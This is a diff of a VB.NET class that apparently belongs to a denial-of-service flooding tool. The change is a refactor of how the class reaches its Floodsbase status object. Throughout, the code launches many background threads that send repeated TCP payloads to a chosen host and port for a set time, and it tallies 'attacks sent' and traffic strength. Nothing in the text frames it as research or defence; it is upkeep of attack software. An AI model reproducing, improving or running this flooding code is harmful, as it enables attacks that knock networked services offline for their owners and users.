@@ -11,9 +11,7 @@ Public Class TCP
     Private AttackRunning As Boolean = False
     Private attacks As Integer = 0
     Private msgLength As Integer
-    Private _Floodsbase As Floodsbase
-    Public Sub New(ByVal model As TcpModel, ByVal Floodsbase As Floodsbase)
-        _Floodsbase = Floodsbase
+    Public Sub New(ByVal model As TcpModel)
         If Not AttackRunning = True Then
             AttackRunning = True
             HostToAttack = model.Host
@@ -22,7 +20,7 @@ Public Class TCP
             TimetoAttack = model.Time
             msgLength = model.Length
             Threads = New Thread(ThreadstoUse - 1) {}
-            _Floodsbase.SetMessage("TCP attack")
+            GetFloodsBase().SetMessage("TCP attack")
             For i As Integer = 0 To ThreadstoUse - 1
                 Threads(i) = New Thread(AddressOf DoWork)
                 Threads(i).IsBackground = True
@@ -30,7 +28,7 @@ Public Class TCP
             Next
 
         Else
-            _Floodsbase.SetMessage("A TCP Attack is Already Running on " & HostToAttack & ":" & Port.ToString)
+            GetFloodsBase().SetMessage("A TCP Attack is Already Running on " & HostToAttack & ":" & Port.ToString)
         End If
     End Sub
 
@@ -41,7 +39,7 @@ Public Class TCP
             ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
-            _Floodsbase.SetMessage("TCP Attack on " & HostToAttack & ":" & Port.ToString & " finished successfully. Attacks Sent: " & attacks.ToString)
+            GetFloodsBase().SetMessage("TCP Attack on " & HostToAttack & ":" & Port.ToString & " finished successfully. Attacks Sent: " & attacks.ToString)
             attacks = 0
         End If
 
@@ -56,11 +54,11 @@ Public Class TCP
                 End Try
             Next
             AttackRunning = False
-            _Floodsbase.SetMessage("TCP Attack on " & HostToAttack & ":" & Port.ToString & " aborted successfully. Attacks Sent: " & attacks.ToString)
+            GetFloodsBase().SetMessage("TCP Attack on " & HostToAttack & ":" & Port.ToString & " aborted successfully. Attacks Sent: " & attacks.ToString)
             attacks = 0
 
         Else
-            _Floodsbase.SetMessage("No TCP Attack is Running!")
+            GetFloodsBase().SetMessage("No TCP Attack is Running!")
         End If
     End Sub
 
@@ -85,7 +83,7 @@ Public Class TCP
                     tcpc.SendTo(buffer, hostep)
 
                     attacks = attacks + 1
-                    _Floodsbase.Set_AttackUpStrengOnByte(attacks * msgLength)
+                    GetFloodsBase().Set_AttackUpStrengOnByte(attacks * msgLength)
                     Dim bytes As Integer = 0
                     Dim sb = New StringBuilder()
                     Dim bytesReceived As Byte() = New Byte(255) {}
@@ -95,7 +93,7 @@ Public Class TCP
                         sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                     Loop Until bytes > 0
 
-                    _Floodsbase.Set_AttackDownStrengOnByte(attacks * sb.ToString().Length)
+                    GetFloodsBase().Set_AttackDownStrengOnByte(attacks * sb.ToString().Length)
 
                     tcpc.Close()
                     Continue Do
